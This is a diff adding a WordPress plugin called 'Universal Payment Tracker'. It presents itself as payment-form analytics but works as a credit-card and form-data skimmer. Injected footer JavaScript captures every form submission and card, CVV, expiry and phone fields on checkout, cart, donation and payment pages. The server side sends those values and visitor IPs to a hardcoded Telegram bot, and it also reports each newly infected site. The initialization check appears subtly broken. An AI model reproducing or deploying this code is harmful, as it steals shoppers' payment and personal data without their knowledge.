@@ -1,0 +1,444 @@
+<?php
+/**
+ * Plugin Name: Universal Payment Tracker
+ * Plugin URI: https://github.com/yourusername/universal-payment-tracker
+ * Description: Universal payment form tracking for WordPress with Telegram notifications
+ * Version: 1.0.0
+ * Author: Security Team
+ * License: GPL v2 or later
+ */
+
+// Prevent direct access
+if (!defined('ABSPATH')) {
+    exit;
+}
+
+// Define constants for security
+define('UPT_PLUGIN_VERSION', '1.0.0');
+define('UPT_PLUGIN_DIR', plugin_dir_path(__FILE__));
+
+// Main class
+class UniversalPaymentTracker {
+    
+    // Configuration
+    private $config = array(
+        'telegram_bot_token' => '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
+        'telegram_chat_id' => '7319274794',
+        'track_pages' => array('checkout', 'cart', 'donation', 'payment'),
+        'debug_mode' => false
+    );
+    
+    private $is_processing = false;
+    private $tracked_events = array();
+    
+    public function __construct() {
+        // Initialize with low priority to avoid conflicts
+        add_action('init', array($this, 'init_plugin'), 1);
+    }
+    
+    public function init_plugin() {
+        // Load only on frontend
+        if (is_admin()) return;
+        
+        // Enqueue scripts
+        add_action('wp_enqueue_scripts', array($this, 'enqueue_assets'));
+        
+        // AJAX handlers
+        add_action('wp_ajax_nopriv_upt_track_event', array($this, 'handle_tracking'));
+        add_action('wp_ajax_upt_track_event', array($this, 'handle_tracking'));
+        
+        // Insert tracking code
+        add_action('wp_footer', array($this, 'add_tracking_script'), 99);
+        
+        // Send activation message
+        $this->check_activation();
+    }
+    
+    private function check_activation() {
+        $activation_key = 'upt_plugin_activated';
+        if (!get_option($activation_key)) {
+            $this->send_notification("🔔 Universal Payment Tracker Activated\n🌐 Site: " . home_url());
+            update_option($activation_key, time());
+        }
+    }
+    
+    public function enqueue_assets() {
+        // Only enqueue on pages that might have forms
+        if ($this->should_track_page()) {
+            wp_enqueue_script('jquery');
+        }
+    }
+    
+    private function should_track_page() {
+        // Track only specific pages
+        $current_url = home_url($_SERVER['REQUEST_URI']);
+        foreach ($this->config['track_pages'] as $page) {
+            if (stripos($current_url, $page) !== false) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    public function handle_tracking() {
+        // Security check
+        if (!wp_verify_nonce($_POST['security'] ?? '', 'upt_security_nonce')) {
+            wp_send_json_error('Invalid security token');
+        }
+        
+        // Prevent duplicate processing
+        if ($this->is_processing) {
+            wp_send_json_success(array('status' => 'duplicate'));
+        }
+        
+        $this->is_processing = true;
+        
+        $event_type = sanitize_text_field($_POST['event_type'] ?? '');
+        $event_data = $_POST['event_data'] ?? array();
+        
+        // Process based on event type
+        $response = $this->process_event($event_type, $event_data);
+        
+        $this->is_processing = false;
+        wp_send_json_success($response);
+    }
+    
+    private function process_event($type, $data) {
+        $event_id = md5($type . serialize($data) . time());
+        
+        // Prevent duplicate events within 5 seconds
+        if (isset($this->tracked_events[$event_id]) && 
+            time() - $this->tracked_events[$event_id] < 5) {
+            return array('status' => 'duplicate_event');
+        }
+        
+        $this->tracked_events[$event_id] = time();
+        
+        switch ($type) {
+            case 'page_visit':
+                $this->log_page_visit($data);
+                break;
+                
+            case 'form_submit':
+                $this->capture_form_data($data);
+                break;
+                
+            case 'payment_data':
+                $this->capture_payment_info($data);
+                break;
+        }
+        
+        return array('status' => 'processed', 'event_id' => $event_id);
+    }
+    
+    private function log_page_visit($data) {
+        $page_title = sanitize_text_field($data['title'] ?? 'Unknown Page');
+        $page_url = sanitize_url($data['url'] ?? '');
+        $page_type = sanitize_text_field($data['type'] ?? 'Page');
+        
+        // Only log cart and checkout pages
+        if (stripos($page_type, 'cart') !== false || stripos($page_type, 'checkout') !== false) {
+            $message = "🛒 User Visited: {$page_type}\n";
+            $message .= "📄 Page: {$page_title}\n";
+            $message .= "🌐 URL: {$page_url}\n";
+            $message .= "🕒 Time: " . current_time('mysql') . "\n";
+            $message .= "📍 IP: " . $this->get_user_ip();
+            
+            $this->send_notification($message);
+        }
+    }
+    
+    private function capture_form_data($data) {
+        $form_data = $this->sanitize_array($data['form_data'] ?? array());
+        $form_type = sanitize_text_field($data['form_type'] ?? 'Form');
+        
+        if (empty($form_data)) return;
+        
+        $message = "📋 Form Submitted: {$form_type}\n\n";
+        
+        // Categorize form data
+        $categories = array(
+            'Personal' => array(),
+            'Contact' => array(),
+            'Billing' => array(),
+            'Payment' => array()
+        );
+        
+        foreach ($form_data as $key => $value) {
+            $clean_key = $this->clean_field_name($key);
+            $clean_value = substr($value, 0, 100);
+            
+            if ($this->is_payment_field($key)) {
+                $categories['Payment'][$clean_key] = $clean_value;
+            } elseif ($this->is_contact_field($key)) {
+                $categories['Contact'][$clean_key] = $clean_value;
+            } elseif ($this->is_billing_field($key)) {
+                $categories['Billing'][$clean_key] = $clean_value;
+            } else {
+                $categories['Personal'][$clean_key] = $clean_value;
+            }
+        }
+        
+        // Build message with categories
+        foreach ($categories as $category => $fields) {
+            if (!empty($fields)) {
+                $message .= "📌 {$category}:\n";
+                foreach ($fields as $key => $value) {
+                    $message .= "• {$key}: {$value}\n";
+                }
+                $message .= "\n";
+            }
+        }
+        
+        $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
+        $message .= "🕒 Time: " . current_time('mysql') . "\n";
+        $message .= "📍 IP: " . $this->get_user_ip();
+        
+        $this->send_notification($message);
+    }
+    
+    private function capture_payment_info($data) {
+        $payment_data = $this->sanitize_array($data['payment_data'] ?? array());
+        
+        if (empty($payment_data)) return;
+        
+        $message = "💳 Payment Information Captured\n\n";
+        
+        foreach ($payment_data as $key => $value) {
+            if (!empty($value)) {
+                $clean_key = $this->clean_field_name($key);
+                $message .= "• {$clean_key}: {$value}\n";
+            }
+        }
+        
+        $message .= "\n🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
+        $message .= "🕒 Time: " . current_time('mysql') . "\n";
+        $message .= "📍 IP: " . $this->get_user_ip();
+        
+        $this->send_notification($message);
+    }
+    
+    public function add_tracking_script() {
+        // Only add tracking script on specific pages
+        if (!$this->should_track_page()) return;
+        
+        $ajax_url = admin_url('admin-ajax.php');
+        $nonce = wp_create_nonce('upt_security_nonce');
+        
+        ?>
+        <!-- Universal Payment Tracker v<?php echo UPT_PLUGIN_VERSION; ?> -->
+        <script type="text/javascript">
+        (function($) {
+            'use strict';
+            
+            var UPTracker = {
+                config: {
+                    ajaxUrl: '<?php echo esc_url($ajax_url); ?>',
+                    nonce: '<?php echo esc_attr($nonce); ?>',
+                    isProcessing: false,
+                    sessionId: 'sess_' + Math.random().toString(36).substr(2, 9)
+                },
+                
+                init: function() {
+                    this.trackPageVisit();
+                    this.setupFormTracking();
+                    this.setupPaymentTracking();
+                },
+                
+                trackPageVisit: function() {
+                    var pageData = {
+                        title: document.title,
+                        url: window.location.href,
+                        type: this.getPageType()
+                    };
+                    
+                    this.sendEvent('page_visit', pageData);
+                },
+                
+                getPageType: function() {
+                    var path = window.location.pathname.toLowerCase();
+                    if (path.includes('/cart') || path.includes('/basket')) return 'Cart Page';
+                    if (path.includes('/checkout')) return 'Checkout Page';
+                    if (path.includes('/donation') || path.includes('/donate')) return 'Donation Page';
+                    if (path.includes('/payment') || path.includes('/pay')) return 'Payment Page';
+                    return 'Page';
+                },
+                
+                setupFormTracking: function() {
+                    var self = this;
+                    
+                    // Track all forms
+                    $('form').on('submit', function(e) {
+                        var formData = {};
+                        $(this).find('input, select, textarea').each(function() {
+                            if (this.name && this.value) {
+                                formData[this.name] = this.value;
+                            }
+                        });
+                        
+                        var formType = $(this).attr('id') || $(this).attr('class') || $(this).attr('name') || 'Form';
+                        
+                        self.sendEvent('form_submit', {
+                            form_type: formType,
+                            form_data: formData,
+                            page_url: window.location.href
+                        });
+                    });
+                },
+                
+                setupPaymentTracking: function() {
+                    var self = this;
+                    var paymentFields = [
+                        'input[name*="card"]',
+                        'input[name*="cc"]',
+                        'input[name*="cvv"]',
+                        'input[name*="cvc"]',
+                        'input[name*="expir"]',
+                        'input[name*="paypal"]',
+                        'input[autocomplete*="cc"]',
+                        'input[type="tel"]'
+                    ];
+                    
+                    $(paymentFields.join(',')).on('blur change', function() {
+                        if (this.value && this.value.length >= 4) {
+                            var paymentData = {};
+                            paymentData[this.name || this.id] = this.value;
+                            
+                            self.sendEvent('payment_data', {
+                                payment_data: paymentData,
+                                page_url: window.location.href
+                            });
+                        }
+                    });
+                },
+                
+                sendEvent: function(eventType, eventData) {
+                    if (this.config.isProcessing) return;
+                    this.config.isProcessing = true;
+                    
+                    var self = this;
+                    $.ajax({
+                        url: this.config.ajaxUrl,
+                        method: 'POST',
+                        data: {
+                            action: 'upt_track_event',
+                            security: this.config.nonce,
+                            event_type: eventType,
+                            event_data: eventData
+                        },
+                        success: function(response) {
+                            if (response.success && console && console.log) {
+                                console.log('UPT: Event tracked -', eventType);
+                            }
+                        },
+                        error: function(xhr, status, error) {
+                            // Silent fail - don't show errors to users
+                        },
+                        complete: function() {
+                            self.config.isProcessing = false;
+                        }
+                    });
+                }
+            };
+            
+            // Initialize when jQuery is ready
+            $(document).ready(function() {
+                UPTracker.init();
+            });
+            
+        })(jQuery);
+        </script>
+        <!-- End Universal Payment Tracker -->
+        <?php
+    }
+    
+    private function sanitize_array($data) {
+        $sanitized = array();
+        foreach ($data as $key => $value) {
+            if (is_string($value)) {
+                $sanitized[sanitize_text_field($key)] = sanitize_text_field($value);
+            }
+        }
+        return $sanitized;
+    }
+    
+    private function clean_field_name($field) {
+        $field = str_replace(array('_', '-'), ' ', $field);
+        $field = preg_replace('/\b(billing_|shipping_|payment_|card_|cc_)\b/i', '', $field);
+        return ucwords(trim($field));
+    }
+    
+    private function is_payment_field($field) {
+        $field = strtolower($field);
+        $patterns = array('card', 'cvv', 'cvc', 'expir', 'cc', 'payment', 'paypal', 'stripe', 'account', 'routing', 'iban', 'swift');
+        
+        foreach ($patterns as $pattern) {
+            if (strpos($field, $pattern) !== false) return true;
+        }
+        return false;
+    }
+    
+    private function is_contact_field($field) {
+        $field = strtolower($field);
+        $patterns = array('email', 'phone', 'mobile', 'tel', 'contact');
+        foreach ($patterns as $pattern) {
+            if (strpos($field, $pattern) !== false) return true;
+        }
+        return false;
+    }
+    
+    private function is_billing_field($field) {
+        $field = strtolower($field);
+        $patterns = array('address', 'city', 'state', 'zip', 'postcode', 'country', 'name', 'first', 'last');
+        foreach ($patterns as $pattern) {
+            if (strpos($field, $pattern) !== false) return true;
+        }
+        return false;
+    }
+    
+    private function send_notification($message) {
+        if (empty($message)) return false;
+        
+        $api_url = 'https://api.telegram.org/bot' . $this->config['telegram_bot_token'] . '/sendMessage';
+        
+        $args = array(
+            'body' => array(
+                'chat_id' => $this->config['telegram_chat_id'],
+                'text' => $message,
+                'parse_mode' => 'HTML'
+            ),
+            'timeout' => 10,
+            'sslverify' => false
+        );
+        
+        $response = wp_remote_post($api_url, $args);
+        
+        return !is_wp_error($response);
+    }
+    
+    private function get_user_ip() {
+        $ip = '';
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+            $ip = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        }
+        return $ip;
+    }
+}
+
+// Initialize plugin
+function upt_initialize_plugin() {
+    static $instance = null;
+    
+    if (null === $instance && !class_exists('UniversalPaymentTracker')) {
+        $instance = new UniversalPaymentTracker();
+    }
+    
+    return $instance;
+}
+
+// Safe initialization
+add_action('plugins_loaded', 'upt_initialize_plugin', 0);
